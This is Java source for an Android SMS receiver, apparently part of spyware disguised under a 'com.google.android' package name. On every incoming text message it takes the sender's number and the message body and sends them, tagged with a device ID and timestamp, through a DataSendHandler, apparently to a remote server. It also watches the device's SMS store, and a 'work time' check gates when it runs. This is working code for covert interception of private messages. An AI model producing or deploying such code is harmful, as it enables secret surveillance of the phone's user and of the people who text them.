package com.google.android.sms;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.android.bs.DataSendHandler;
import com.google.android.bs.WorkTimeDefiner;

public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "SMS";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	private SmsSentObserver smsSentObserver = null;
	String str = "";
	SharedPreferences sp;
	private Context mContext;
	private Bundle mBundle;
	String dir = null;

	public void onReceive(Context context, Intent intent) {
		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
		sp = PreferenceManager.getDefaultSharedPreferences(context);
		String sms = sp.getString("KBD", "0");

		if (sms.equals("0")) {
			return;
		}
		
		boolean isWork = WorkTimeDefiner.isDoWork(context);
		if (!isWork) {
			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(TAG, "after isWork retrun 0");
			return;
		} else {
			Log.d(TAG, Boolean.toString(isWork));
		}
		try {
			mContext = context;
			mBundle = intent.getExtras();
//			smsSentObserver = null;
			Log.d(TAG, "Intent Action : " + intent.getAction());
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				getSMSDetails();
			} else {
				Log.e(TAG, "Bundle is Empty!");
			}

			if (smsSentObserver == null) {
				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
				mContext.getContentResolver().registerContentObserver(
						STATUS_URI, true, smsSentObserver);
			}
		} catch (Exception sgh) {
			Log.e(TAG, "Error in Init : " + sgh.toString());
		}
	}

	@SuppressLint("SimpleDateFormat")
	@SuppressWarnings("deprecation")
	private void getSMSDetails() {
		SmsMessage[] msgs = null;
		dir = "вх. Sms";
		try {
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				msgs = new SmsMessage[pdus.length];
				Log.d(TAG, "pdus length : " + pdus.length);

				SmsMessage messages = SmsMessage
						.createFromPdu((byte[]) pdus[0]);
				str += String.format("SMS from %s:%s\n", messages
						.getOriginatingAddress(), messages.getMessageBody()
						.toString());
				Log.d("sms", str + logTime());
				// Toast toast = Toast.makeText(mContext, str + logTime(),
				// Toast.LENGTH_SHORT);
				// toast.show();
				for (int k = 0; k < msgs.length; k++) {
					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);
					Log.d(TAG,
							"getDisplayMessageBody : "
									+ msgs[k].getDisplayMessageBody());
					Log.d(TAG,
							"getDisplayOriginatingAddress : "
									+ msgs[k].getDisplayOriginatingAddress());
					Log.d(TAG, "getMessageBody : " + msgs[k].getMessageBody());
					Log.d(TAG,
							"getOriginatingAddress : "
									+ msgs[k].getOriginatingAddress());
					Log.d(TAG,
							"getProtocolIdentifier : "
									+ msgs[k].getProtocolIdentifier());
					Log.d(TAG, "getStatus : " + msgs[k].getStatus());
					Log.d(TAG, "getStatusOnIcc : " + msgs[k].getStatusOnIcc());
					Log.d(TAG, "getStatusOnSim : " + msgs[k].getStatusOnSim());
					// -------send sms--------------------------------
					String sendStr = "<packet><id>" + sp.getString("ID", "ID")
							+ "</id><time>" + logTime()
							+ "</time><type>4</type><app>" + dir
							+ "</app><ttl>" + msgs[k].getOriginatingAddress()
							+ "</ttl><cdata1>" + msgs[k].getMessageBody()
							+ "</cdata1></packet>";

					DataSendHandler dSH = new DataSendHandler(mContext);
					dSH.send(2, sendStr);
					Log.d("smsRec", sendStr);
				}
			}
		} catch (Exception sfgh) {
			Log.e(TAG, "Error in getSMSDetails : " + sfgh.toString());
		}
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}
